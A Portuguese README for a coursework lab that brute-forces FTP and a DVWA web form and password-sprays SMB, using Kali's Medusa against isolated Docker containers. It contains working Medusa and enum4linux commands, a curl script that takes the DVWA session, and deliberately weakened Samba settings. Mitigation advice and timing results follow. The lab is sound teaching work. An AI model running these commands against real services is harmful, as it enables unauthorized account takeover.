# Laboratório de Força Bruta com Kali Linux, Medusa e Docker

## 1. Apresentação do desafio

O desafio propõe implementar, documentar e compartilhar um projeto prático de segurança ofensiva utilizando Kali Linux e a ferramenta Medusa contra ambientes vulneráveis. Os cenários previstos são:

- ataque de força bruta em FTP;
- automação de tentativas em formulário web com DVWA;
- enumeração de usuários e password spraying em SMB;

Este laboratório reproduz os três cenários em containers Docker isolados, com endereços IP fixos, usuários controlados e senhas geradas a partir de padrões definidos. O objetivo é demonstrar, de forma reproduzível, como ataques de força bruta e spraying funcionam, quais são seus limites e como mitigá-los.

> **Aviso:** o ambiente contém serviços intencionalmente vulneráveis. Ele não deve ser exposto à internet nem reutilizado em contexto que exceda um laboratório isolado para experimentação.

## 2. Mudanças e justificativas

O desafio original sugere duas VMs no VirtualBox: Kali Linux e Metasploitable 2. Neste projeto, o ambiente foi adaptado para Docker.

| Item original       | Decisão adotada | Justificativa |
|---------------------|-----------------|---------------|
| VirtualBox com VMs  | Docker          | Mais leve, reproduzível e fácil de limpar |
| Kali Linux em VM    | Container `kalilinux/kali-rolling` | Mesmas ferramentas, sem overhead de virtualização |
| Metasploitable 2    | Containers Debian 12 | Controle exato de usuários, senhas e serviços |
| Rede host-only      | Rede Docker `172.28.0.0/16` e IPs fixos | Endereços conhecidos e isolamento do host |
| Senhas padronizadas | `000aa` `00aa`  | Espaço menor e testes de todas as combinações, execução viável e comparação de tempos |
| Um cenário de teste | Três ensaios    | Compara 9 usuários, 1 usuário em `00aa` e 1 usuário em `000aa` |

Também foram adotadas estas premissas:

- um container para cada serviço explorado para permitir testes em serviços específicos;
- IPs fixos para todos os containers;
- nenhuma porta publicada no host;
- todos os scripts com contabilização de tempo em `HH:MM:SS`;
- wordlists e credenciais explícitas em arquivos, sem lógica escondida de "trial" nos scripts;
- SMB spraying apenas no ensaio com 9 usuários, pois spraying exige múltiplos usuários.

## 3. Criação do ambiente

### 3.0 Pré-requisitos, estrutura e wordlists

Requisitos:

- Docker instalado e usuário no grupo `docker`;
- cerca de 5 GB de espaço livre;
- pelo menos 4 GB de memória disponível;
- acesso à internet para baixar as imagens e pacotes durante o build.

Estrutura do projeto:

```text
.
├── scripts/
│   ├── 00-check-prereqs.sh
│   ├── 01-password-generator.sh
│   ├── 02-wordlists-generate.sh
│   ├── 03-ftp-install-config.sh
│   ├── 04-ftp-test.sh
│   ├── 05-web-install-config.sh
│   ├── 06-web-test.sh
│   ├── 07-smb-install-config.sh
│   ├── 08-smb-test.sh
│   ├── 09-kali-setup.sh
│   ├── 10-ftp-attack.sh
│   ├── 11-web-attack.sh
│   ├── 12-smb-attack.sh
│   └── 99-teardown.sh
├── docker/
│   ├── ftp/
│   ├── web/
│   ├── smb/
│   └── kali/
├── wordlists/
├── logs/
├── images/
├── chalenge.md
├── my-plan.md
├── plan.md
└── README.md
```

Rede e endereços:

| Container  | IP            | Serviço                             |
|------------|---------------|-------------------------------------|
| `lab-ftp`  | `172.28.0.10` | FTP (vsftpd)                        |
| `lab-web`  | `172.28.0.11` | Web (Apache + PHP + MariaDB + DVWA) |
| `lab-smb`  | `172.28.0.12` | SMB (Samba)                         |
| `lab-kali` | `172.28.0.13` | Kali + Medusa + ferramentas         |

A rede Docker utilizada é `lab-net`, subnet `172.28.0.0/16`.

Verificação inicial:

```bash
bash scripts/00-check-prereqs.sh
```

O script verifica comandos auxiliares, Docker, imagens base, subnet livre, disco e memória.

| ![resultado-do-script-de-validação](images/001.jpg) |
|:--:|
| _resultado do script de validação_ |

#### Geração das wordlists

O gerador aceita os tokens `d` (dígito), `l` (minúscula), `L` (maiúscula) e `#` (símbolo). A repetição de caracteres dentro de cada classe é proibida.

Exemplos e contagens:

| Padrão              | Total |
|---------------------|-------|
| `ddll` (`00aa`)     | 58.500 |
| `dddll` (`000aa`)   | 468.000 |
| `ddddll` (`0000aa`) | 3.276.000 |
| `dddlll` (`000aaa`) | 11.232.000 |
| `ddllLL##`          | 3.422.250.000 |

Exemplos de uso para geração de todas as combinações possíveis de um padrão:

```bash
bash scripts/01-password-generator.sh --pattern ddll --all > wordlists/trial1-passwords.txt
bash scripts/01-password-generator.sh --pattern dddll --all > wordlists/trial3-passwords.txt
```

| ![resultado-da-geração-de-senhas-para-ensaios-1-e-3](images/002.jpg) |
|:--:|
| _resultado da geração de senhas para-ensaios 1 e 3_ |

> Nota: ensaios 1 e 2 usam arquivos com conteúdo igual

Exemplo de uso para geração de 8 senhas aleatórias

```bash
bash scripts/01-password-generator.sh --pattern ddll --random --count 8 --seed 42
```

| ![resultado-da-geração-de-8-senhas-aleatórias](images/003.jpg) |
|:--:|
| _resultado da geração de 8 senhas aleatórias_ |


Arquivos gerados em `wordlists/`:

| Arquivo                  | Conteúdo                                  |
|--------------------------|-------------------------------------------|
| `users.txt`              | Lista mestre dos 9 usuários               |
| `trial1-users.txt`       | Os 9 usuários                             |
| `trial1-credentials.txt` | Credenciais corretas; `backup:12ab`       |
| `trial1-passwords.txt`   | 58.500 candidatas (`00aa`)                |
| `trial1-spray.txt`       | 10 senhas para spraying, incluindo `12ab` |
| `trial2-users.txt`       | `admin`                                   |
| `trial2-credentials.txt` | Credenciais corretas; `admin:12ab`        |
| `trial2-passwords.txt`   | 58.500 candidatas (`00aa`)                |
| `trial3-users.txt`       | `admin`                                   |
| `trial3-credentials.txt` | Credenciais corretas; `admin:123ab`       |
| `trial3-passwords.txt`   | 468.000 candidatas (`000aa`)              |

`credentials.txt` contém as credenciais corretas, usadas para configurar o serviço e validar os acessos. `passwords.txt` contém a lista de candidatas do ataque. `spray.txt` contém a lista reduzida do password spraying.

Lista de usuários:

```text
admin
administrator
root
user
test
guest
support
backup
adm
```

Matriz dos ensaios:

| # | Usuários  | Padrão  | Serviços          | Senha fixa        | Resultado esperado              |
|---|-----------|---------|-------------------|-------------------|---------------------------------|
| 1 | 9         | `ddll`  | FTP/Web/SMB spray | `backup` = `12ab` | FTP/Web: 9/9; SMB: 1/1 `backup` |
| 2 | 1 `admin` | `ddll`  | FTP, Web          | `admin` = `12ab`  | 1/1                             |
| 3 | 1 `admin` | `dddll` | FTP, Web          | `admin` = `123ab` | 1/1                             |

Posições das senhas fixas na ordem lexicográfica do gerador:

- `12ab`: linha 6.501 de 58.500;
- `123ab`: linha 52.651 de 468.000.


### 3.1 Criação do serviço FTP

O serviço FTP usa Debian 12 com `vsftpd`, no container `lab-ftp` (`172.28.0.10`).

Configuração principal:

```ini
listen=YES
listen_ipv6=NO
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
chroot_local_user=YES
allow_writeable_chroot=YES
pasv_enable=YES
pasv_min_port=40000
pasv_max_port=40100
pasv_address=172.28.0.10
pam_service_name=vsftpd
seccomp_sandbox=NO
```

Criação e configuração:

```bash
bash scripts/03-ftp-install-config.sh --credentials wordlists/trial1-credentials.txt
```

O script constrói a imagem, cria a rede se necessário, remove o container anterior, sobe o `lab-ftp` e cria os usuários a partir do arquivo de credenciais.

| ![criação-do-container-do-serviço-FTP-1](images/004.jpg) |
|:--:|
| _criação do container do serviço FTP (1/2)_ |

| ![criação-do-container-do-serviço-FTP-2](images/005.jpg) |
|:--:|
| _criação do container do serviço FTP (2/2)_ |

Testes:

```bash
bash scripts/04-ftp-test.sh --credentials wordlists/trial1-credentials.txt
```

Os testes partem de um container efêmero `debian:12` na rede `lab-net` e de nome `lab-ftp-test` e verificam:

- login com credencial correta e listagem do diretório;
- falha de autenticação com senha incorreta.

| ![teste-de-acesso-ao-serviço-FTP](images/006.jpg) |
|:--:|
| _teste de acesso ao serviço FTP_ |

### 3.2 Criação do serviço Web

O serviço web usa Debian 12 com Apache, PHP 8.2, MariaDB e DVWA 2.5, no container `lab-web` (`172.28.0.11`).

Características:

- DVWA clonado de `https://github.com/digininja/DVWA.git`;
- caminho `/var/www/html/DVWA`;
- banco `dvwa`, usuário `dvwa`;
- `default_security_level=low`;
- página de ataque: `vulnerabilities/brute/`;
- no nível `low`, a página usa GET, MD5 e não exige CSRF;
- o login do DVWA exige CSRF, então o ataque autentica com `curl` antes de chamar o Medusa.

Criação e configuração:

```bash
bash scripts/05-web-install-config.sh --credentials wordlists/trial1-credentials.txt
```

O script sobe o container, inicializa o MariaDB, configura o DVWA, executa o setup do banco e insere/atualiza os 9 usuários na tabela `users` com senha em MD5.

| ![criação-do-container-do-serviço-web-1](images/007.jpg) |
|:--:|
| _criação do container do serviço web (1/2)_ |

| ![criação-do-container-do-serviço-web-2](images/008.jpg) |
|:--:|
| _criação do container do serviço web (2/2)_ |

Testes:

```bash
bash scripts/06-web-test.sh --credentials wordlists/trial1-credentials.txt
```

Os testes rodam dentro de um container efêmero de nome `lab-web-test` e verificam:

- acesso à página de login;
- autenticação com `admin` e senha correta;
- falha com senha incorreta.

| ![teste-de-acesso-ao-serviço-web](images/009.jpg) |
|:--:|
| _teste de acesso ao serviço web_ |

### 3.3 Criação do serviço SMB

O serviço SMB usa Debian 12 com Samba 4.17, no container `lab-smb` (`172.28.0.12`).

Configuração principal:

```ini
[global]
   workgroup = WORKGROUP
   server string = Lab SMB
   security = user
   map to guest = never
   server min protocol = NT1
   ntlm auth = yes
   restrict anonymous = 0
   passdb backend = tdbsam
   smb ports = 445 139
   log file = /var/log/samba/log.%m
   max log size = 1000

[labshare]
   path = /srv/smb/labshare
   browseable = yes
   read only = no
   valid users = @smbusers
   create mask = 0660
   directory mask = 0770
```

Decisões de compatibilidade:

- `server min protocol = NT1` permite o uso de `enum4linux`/`rpcclient`;
- `ntlm auth = yes` permite a autenticação usada pelo Medusa;
- `restrict anonymous = 0` permite a enumeração de usuários no laboratório;
- o Medusa 2.3-3 do Kali é compilado com `libsmb2` e negocia SMB2/3.

Criação e configuração:

```bash
bash scripts/07-smb-install-config.sh --credentials wordlists/trial1-credentials.txt
```

| ![criação-do-container-do-serviço-smb-1](images/010.jpg) |
|:--:|
| _criação do container do serviço SMB (1/2)_ |

| ![criação-do-container-do-serviço-smb-2](images/011.jpg) |
|:--:|
| _criação do container do serviço SMB (2/2)_ |

Testes:

```bash
bash scripts/08-smb-test.sh --credentials wordlists/trial1-credentials.txt
```

Os testes verificam:

- listagem de shares e acesso ao `labshare` com credencial correta;
- falha com senha incorreta.

| ![teste-de-acesso-ao-serviço-smb](images/012.jpg) |
|:--:|
| _teste de acesso ao serviço SMB_ |

## 4. Execução dos serviços alvo

Os serviços podem ser verificados com:

```bash
docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Networks}}' --filter "name=lab"
docker network inspect lab-net
```

| ![listagem-dos-containers-de-serviço](images/013.jpg) |
|:--:|
| _listagem dos containers de serviço_ |

Endereços:

| Serviço | URL/IP                     | Porta |
|---------|----------------------------|-------|
| FTP     | `ftp://172.28.0.10`        | 21    |
| Web     | `http://172.28.0.11/DVWA/` | 80    |
| SMB     | `//172.28.0.12/labshare`   | 445/139 |

Nenhuma porta é publicada no host. Todo acesso é feito pela rede Docker ou por `docker exec` conforme especificado na descrição do desafio.

## 5. Execução do Kali para exploração dos alvos

O container `lab-kali` (`172.28.0.13`) é construído com:

- `medusa` 2.3-3;
- `enum4linux`;
- `smbclient`;
- `nmap`;
- `curl`;
- `lftp`.

Criação:

```bash
bash scripts/09-kali-setup.sh
```

| ![criação-do-container-do-kali-1](images/014.jpg) |
|:--:|
| _criação do container do kali (1/2)_ |

| ![criação-do-container-do-kali-2](images/015.jpg) |
|:--:|
| _criação do container do kali (2/2)_ |

Validação:

```bash
docker exec lab-kali medusa -V
docker exec lab-kali enum4linux -h | head -n 3
docker exec lab-kali smbclient --version
```

| ![validação-do-container-do-kali](images/016.jpg) |
|:--:|
| _validação do container do kali_ |

### 5.1 Exploração FTP com força bruta

#### Ensaio 1 (9 usuários, `00aa`, FTP):

```bash
bash scripts/10-ftp-attack.sh \
  --users wordlists/trial1-users.txt \
  --passwords wordlists/trial1-passwords.txt
```

Comando executado dentro do Kali:

```bash
medusa \
  -h 172.28.0.10 \
  -U /wordlists/trial1-users.txt \
  -P /wordlists/trial1-passwords.txt \
  -M ftp \
  -t 4 \
  -g 10 \
  -v 4 \
  -O /logs/medusa-ftp-trial1.log
```

| ![resultado do ataque de força bruta ao serviço FTP - ensaio 1](images/017.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço FTP - ensaio 1_ |

### 5.2 Exploração Web com força bruta

#### Ensaio 1 (9 usuários, `00aa`, web):

```bash
bash scripts/11-web-attack.sh \
  --users wordlists/trial1-users.txt \
  --passwords wordlists/trial1-passwords.txt \
  --credentials wordlists/trial1-credentials.txt
```

O script primeiro obtém uma sessão autenticada no DVWA:

```bash
COOKIE=/tmp/dvwa.cookie
TOKEN=$(curl -s -c "$COOKIE" http://172.28.0.11/DVWA/login.php \
  | awk -F"value='" '/user_token/ {print $2}' | cut -d"'" -f1)

curl -s -b "$COOKIE" -c "$COOKIE" \
  -d "username=admin&password=${ADMIN_PASS}&user_token=${TOKEN}&Login=Login" \
  http://172.28.0.11/DVWA/login.php

curl -s -b "$COOKIE" -c "$COOKIE" \
  -d "security=low&seclev_submit=Submit" \
  http://172.28.0.11/DVWA/security.php

SESSION=$(awk '$6 == "PHPSESSID" {print $7}' "$COOKIE")
```

Depois executa:

```bash
medusa -h 172.28.0.11 \
  -U /wordlists/trial1-users.txt \
  -P /wordlists/trial1-passwords.txt \
  -M web-form \
  -m FORM:"/DVWA/vulnerabilities/brute/" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m FORM-DATA:"get?username=&password=&Login=Login" \
  -m CUSTOM-HEADER:"Cookie: security=low; PHPSESSID=${SESSION}" \
  -t 1 \
  -O /logs/medusa-web-trial1.log
```

| ![resultado-do-ataque-de-força-bruta-ao-serviço-web-1](images/018.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço web - ensaio 1 (1/2)_ |

| ![resultado-do-ataque-de-força-bruta-ao-serviço-web-2](images/019.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço FTP - ensaio 1 (2/2)_ |

### 5.3 Exploração SMB com password spraying

O spraying é executado apenas no ensaio 1, pois precisa de múltiplos usuários.

Enumeração de usuários:

```bash
bash scripts/12-smb-attack.sh \
  --users wordlists/trial1-users.txt \
  --spray wordlists/trial1-spray.txt
```

Comando de enumeração dentro do Kali:

```bash
enum4linux -U -S -P 172.28.0.12 | tee /logs/enum4linux-smb-trial1.log
```

Password spraying:

```bash
while IFS= read -r pass; do
  medusa -h 172.28.0.12 \
    -U /wordlists/trial1-users.txt \
    -p "$pass" \
    -M smbnt \
    -m GROUP:LOCAL \
    -m AUTH:LMv2 \
    -m MODE:AUTO \
    -t 1 \
    -O /logs/medusa-smb-trial1.log
done < /wordlists/trial1-spray.txt
```

A lista `trial1-spray.txt` tem 10 senhas e inclui `12ab`. O usuário `backup` tem essa senha fixa, então o spraying deve encontrá-lo. Os demais usuários têm senhas aleatórias que não estão na lista de spraying.

Resultado esperado:

- `backup` / `12ab` encontrado;
- demais usuários não encontrados pelo spraying.

| ![resultado-do-ataque-de-spraying-smb-1](images/018.jpg) |
|:--:|
| _resultado do ataque de spraying SMB - ensaio 1 (1/2)_ |

| ![resultado-do-ataque-de-spraying-smb-2](images/019.jpg) |
|:--:|
| _resultado do ataque de spraying SMB - ensaio 1 (2/2)_ |

### 5.4 Execução do ensaio 2

O ensaio 2 repete os ataques de força bruta, ou seja, os ataques aos serviços FTP e web. Como os detalhes estão nas seções anteriores, vamos partir para a execução mais direta possível.

Além disso, os ensaios 2 e 3 só procuram pela primeira senha válida. A opção `-f` garante isso. Portanto, espera-se que sejam execuções mais rápidas e o objetivo principal é comparar o tempo para encontrar uma senha de 4 dígitos e o tempo para encontrar uma senha de 5 dígitos. 

O primeiro passo é recriar os serviços com as credenciais do ensaio 2:

```bash
bash scripts/03-ftp-install-config.sh --credentials wordlists/trial2-credentials.txt
bash scripts/05-web-install-config.sh --credentials wordlists/trial2-credentials.txt
bash scripts/07-smb-install-config.sh --credentials wordlists/trial2-credentials.txt
```

#### Ensaio 2 (1 usuário, `00aa`, FTP):

```bash
bash scripts/10-ftp-attack.sh \
  --users wordlists/trial2-users.txt \
  --passwords wordlists/trial2-passwords.txt
```

| ![resultado-do-ataque-de-força-bruta-ao-serviço-FTP-ensaio2](images/022.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço FTP - ensaio 2_ |

#### Ensaio 2 (1 usuário, `00aa`, web):

```bash
bash scripts/11-web-attack.sh \
  --users wordlists/trial2-users.txt \
  --passwords wordlists/trial2-passwords.txt \
  --credentials wordlists/trial2-credentials.txt
```

| ![resultado-do-ataque-de-força-bruta-ao-serviço-web-ensaio2](images/023.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço web - ensaio 2_ |

### 5.5 Execução do ensaio 3

O mesmo vale para o ensaio 3:

```bash
bash scripts/03-ftp-install-config.sh --credentials wordlists/trial3-credentials.txt
bash scripts/05-web-install-config.sh --credentials wordlists/trial3-credentials.txt
bash scripts/07-smb-install-config.sh --credentials wordlists/trial3-credentials.txt
```

#### Ensaio 3 (1 usuário, `000aa`, FTP):

```bash
bash scripts/10-ftp-attack.sh \
  --users wordlists/trial3-users.txt \
  --passwords wordlists/trial3-passwords.txt
```

| ![resultado-do-ataque-de-força-bruta-ao-serviço-ftp-ensaio3](images/024.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço FTP - ensaio 3_ |

#### Ensaio 3 (1 usuário, `000aa`, web):

```bash
bash scripts/11-web-attack.sh \
  --users wordlists/trial3-users.txt \
  --passwords wordlists/trial3-passwords.txt \
  --credentials wordlists/trial3-credentials.txt
```

| ![resultado-do-ataque-de-força-bruta-ao-serviço-web-ensaio3](images/025.jpg) |
|:--:|
| _resultado do ataque de força bruta ao serviço web - ensaio 3_ |

## 6. Resultados e tempos

Tabela com os resultados de cada ensaio:

| # | Serviço | Usuários | Padrão  | Tentativas | Tempo total | Encontradas |
|---|---------|----------|---------|------------|-------------|-------------|
| 1 | FTP     | 9        | `00aa`  | 526.500    | 00:17:44    | 8/9         |
| 1 | Web     | 9        | `00aa`  | 526.500    | 00:08:00    | 9/9         |
| 1 | SMB     | 9        | `00aa`  | 90         | 00:00:04    | 1/1         |
| 2 | FTP     | 1        | `00aa`  | 6.501      | 00:00:14    | 1/1         |
| 2 | Web     | 1        | `00aa`  | 6.501      | 00:00:11    | 1/1         |
| 3 | FTP     | 1        | `000aa` | 52.651     | 00:02:42    | 1/1         |
| 3 | Web     | 1        | `000aa` | 52.651     | 00:01:23    | 1/1         |

Comparação esperada:

- `000aa` tem 8 vezes mais combinações que `00aa`;
- as senhas fixas `12ab` e `123ab` estão em posições relativas semelhantes (~11%);
- o tempo do ensaio 3 deve ser aproximadamente 8 vezes o do ensaio 2, se o throughput for o mesmo.

## 7. Medidas de mitigação

### 7.1 Gerais

- Política de senhas fortes, com comprimento e complexidade adequados.
- O comprimento adequado é o mais eficaz para evitar ataques de força bruta, já que cada caractere adicional demanda acrescimo exponencial do tempo de ataque.
- MFA sempre que o serviço permitir, já que MFA vai invalidar a grande maioria dos mecanismos de ataque de força bruta ou mesmo spraying.
- Bloqueio temporário de conta após tentativas falhas.
- Rate limiting e detecção de padrões de força bruta.
- Monitoramento e alerta para múltiplas falhas de autenticação seguidas.
- Princípio do menor privilégio pode ajudar mesmo quando um vazamento for efetivado.
- Segmentação de rede e restrição de acesso aos serviços.
- Revisão periódica de contas e remoção de contas padrão.

### 7.2 FTP

- Desabilitar acesso anônimo.
- Usar FTPS ou SFTP em vez de FTP puro.
- Aplicar bloqueio de conta e `fail2ban`.
- Restringir o acesso por IP e por rede.
- Usar senhas fortes e únicas.
- Monitorar logins falhos e transferências.

### 7.3 Web

- Implementar rate limiting e bloqueio de conta.
- Usar MFA para contas administrativas.
- Armazenar senhas com algoritmos modernos, como Argon2 ou bcrypt; o MD5 do DVWA é intencionalmente inseguro.
- Proteger formulários com CSRF token, CAPTCHA e validação server-side.
- Usar WAF e monitoramento de tentativas de login.
- Não expor aplicações vulneráveis à internet.

### 7.4 SMB

- Desabilitar SMB1 e exigir SMB2/3.
- Exigir assinatura SMB e NTLMv2; desabilitar NTLMv1.
- Desabilitar enumeração anônima (`restrict anonymous = 2`).
- Aplicar bloqueio de conta e política de senhas fortes.
- Restringir o share por grupo e por IP.
- Monitorar tentativas de autenticação e enumeração.

### 7.5 Ajustes específicos do laboratório

As configurações abaixo foram usadas apenas para viabilizar os testes e não devem ser replicadas em produção:

- `server min protocol = NT1` no Samba;
- `ntlm auth = yes` no Samba;
- `restrict anonymous = 0` no Samba;
- `default_security_level=low` no DVWA;
- senhas curtas e previsíveis;
- MD5 no armazenamento de senhas do DVWA.

## 8. Conclusão

Os ensaios mostram que o resultado depende tanto do tamanho do espaço de busca quanto da velocidade e das características do serviço. No ensaio 2, a senha `12ab` foi encontrada na tentativa 6.501: o FTP levou **00:00:14** e o formulário Web, **00:00:11**. No ensaio 3, `123ab` apareceu na tentativa 52.651: o FTP levou **00:02:42** e a Web, **00:01:23**. Embora o padrão `000aa` tenha oito vezes mais combinações que `00aa`, os tempos observados foram cerca de **11,6 vezes** maiores no FTP e **7,5 vezes** maiores na Web. A comparação é compatível com o crescimento do espaço de busca, mas não é uma proporção exata: são medidas de execuções individuais, afetadas por throughput, latência, concorrência e custos próprios de cada serviço. As posições das senhas fixas são próximas em termos relativos (cerca de 11% da lista), o que torna os ensaios comparáveis.

No ensaio 1, com nove usuários e a lista `00aa`, a Web encontrou **9/9** credenciais em **00:08:00**, enquanto o FTP encontrou **8/9** em **00:17:44**. Assim, nesse ensaio, a Web concluiu a busca em menos da metade do tempo do FTP, mas a senha de `root` não foi encontrada no FTP. Essa é uma defesa do próprio serviço FTP usado no ambiente. O password spraying SMB encontrou `backup` / `12ab` entre as 90 tentativas em **00:00:04**. Esse tempo inclui enumeração e validação, portanto não é diretamente comparável ao tempo de uma única autenticação por tentativa nos outros serviços. Contudo, é o que consegue o resultado em menor tempo possível além de ser geralmente mais difícil de detectar.

Os resultados também evidenciam diferenças de configuração e de protocolo: o DVWA de baixa segurança aceita tentativas automatizadas no formulário, e as credenciais SMB puderam ser enumeradas antes do spraying. A execução é uma demonstração controlada, não uma estimativa universal de tempo para quebrar senhas. Ela depende do hardware, das versões e configurações dos serviços, do número de threads, da rede e dos parâmetros do Medusa. Além disso, o ambiente usa senhas curtas e previsíveis, e o SMB foi deliberadamente configurado para permitir enumeração e compatibilidade com o teste a exemplo do que foi feito pelos professores durante as aulas. Em conjunto, os ensaios reforçam a necessidade de uso de senhas longas e únicas, MFA, limitação de tentativas, monitoramento e protocolos/configurações seguros.

As evidências detalhadas estão nos logs versionados em `logs/`: `10-ftp-attack-20261029-150038.log` e `11-web-attack-20261029-153043.log` registram o ensaio 1; `12-smb-attack-20261029-154710.log` registra enumeração e spraying; `10-ftp-attack-20261029-162654.log` e `11-web-attack-20261029-162919.log` registram o ensaio 2; `10-ftp-attack-20261029-164035.log` e `11-web-attack-20261029-165041.log` registram o ensaio 3. As capturas associadas aos ataques estão nas imagens `017`–`025` referenciadas na seção 5. A tabela da seção 6 resume os tempos e as contagens usados nesta análise.

## 9. Referências

- Kali Linux: https://www.kali.org/
- DVWA: https://github.com/digininja/DVWA
- Medusa: https://jmk-foofus.github.io/medusa/medusa.html
- Medusa SMBNT: https://jmk-foofus.github.io/medusa/medusa-smbnt.html
- Nmap: https://nmap.org/book/man.html
- SecLists: https://github.com/danielmiessler/SecLists
- SANS ISC: https://isc.sans.edu/
- Docker: https://docs.docker.com/
- Samba `smb.conf`: https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html
- OWASP WSTG: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
